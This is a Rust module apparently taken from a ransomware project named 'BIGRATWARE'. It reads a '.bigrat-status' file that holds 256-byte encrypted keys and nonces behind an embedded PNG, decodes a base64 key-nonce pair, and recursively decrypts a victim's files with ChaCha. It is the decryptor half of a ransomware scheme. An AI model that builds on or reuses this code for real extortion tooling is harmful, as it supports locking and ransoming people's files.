use std::fs::File;
use std::io;
use std::io::{Read, Seek, SeekFrom};
use std::path::Path;
use anyhow::{Context, Result};
use base64::Engine;
use decryptor::decrypt_file_chacha;
use crate::BIGRAT_PNG;

#[derive(Debug)]
pub enum Status {
    Started,
    Finished,
}

#[derive(Debug)]
pub struct StatusData {
    pub status: Status,
    pub encrypted_key: [u8; 256],
    pub encrypted_nonce: [u8; 256],
}

#[derive(Debug)]
pub enum StatusReadError {
    IoError(io::Error),
    DoesNotExist,
    Invalid(String),
}

impl From<io::Error> for StatusReadError {
    fn from(value: io::Error) -> Self {
        Self::IoError(value)
    }
}

/// Get encrypted key, encrypted nonce and status of the encryption process
/// (started or finished) from a `$working_path/.bigrat-status` file
pub fn get_status_data(working_path: &Path) -> core::result::Result<StatusData, StatusReadError> {
    let status_file_path = working_path.join(".bigrat-status");
    if !status_file_path.exists() {
        return Err(StatusReadError::DoesNotExist);
    }
    let mut status_file = File::open(status_file_path)?;
    if status_file.metadata()?.len() <= BIGRAT_PNG.len() as u64 + 512 {
        return Err(StatusReadError::Invalid("File is smaller then expected".to_string()));
    }
    status_file.seek(SeekFrom::Start(BIGRAT_PNG.len() as u64 + 512))?;

    let mut status = String::new();
    status_file.read_to_string(&mut status)?;
    let mut statuses = status.split(';')
        .map(|s| s.strip_prefix("BIGRATWARE_STATUS=").unwrap_or(""))
        .collect::<Vec<&str>>();
    statuses.pop();
    let status = match statuses.last() {
        None => return Err(StatusReadError::Invalid("No actual status string found".to_string())),
        Some(&"started") => Status::Started,
        Some(&"finished") => Status::Finished,
        Some(val) => return Err(StatusReadError::Invalid(format!("Unrecognized status: {val}"))),
    };

    status_file.seek(SeekFrom::Start(BIGRAT_PNG.len() as u64))?;
    let mut encrypted_key = [0u8; 256];
    let _ = status_file.read(&mut encrypted_key)?;
    let mut encrypted_nonce = [0u8; 256];
    let _ = status_file.read(&mut encrypted_nonce)?;

    Ok(StatusData {
        status,
        encrypted_key,
        encrypted_nonce,
    })
}

pub fn decode_pair_base64(pair_base64: &str) -> Result<([u8; 32], [u8; 19])> {
    let mut pair = [0u8; 32+19];
    // Ignoring trailing bits, because of the nature of base64
    // https://github.com/marshallpierce/rust-base64#i-want-canonical-base64-encodingdecoding
    base64::engine::general_purpose::STANDARD_NO_PAD.decode_slice_unchecked(pair_base64, &mut pair)
        .with_context(|| "Error decoding base64 of encrypted key-nonce pair")?;

    Ok((
        <[u8; 32]>::try_from(&pair[..32])?,
        <[u8; 19]>::try_from(&pair[32..])?,
    ))
}

pub fn decrypt_recursive(path: &Path, key: &[u8; 32], nonce: &[u8; 19]) -> Result<()> {
    for entry in path.read_dir()? {
        let entry = entry?;
        if entry.file_type()?.is_dir() {
            decrypt_recursive(&entry.path(), &key, &nonce)?;  // TODO: handle errors
            continue;
        }

        let encrypted_file = File::open(entry.path())?;
        if let Err(error) = decrypt_file_chacha(
            &encrypted_file,
            entry.path().with_extension(""),
            *key,
            *nonce
        ) {
            eprintln!("Failed to decrypt file {:?}: {}", entry.path(), error);
            continue;
        }
    }

    Ok(())
}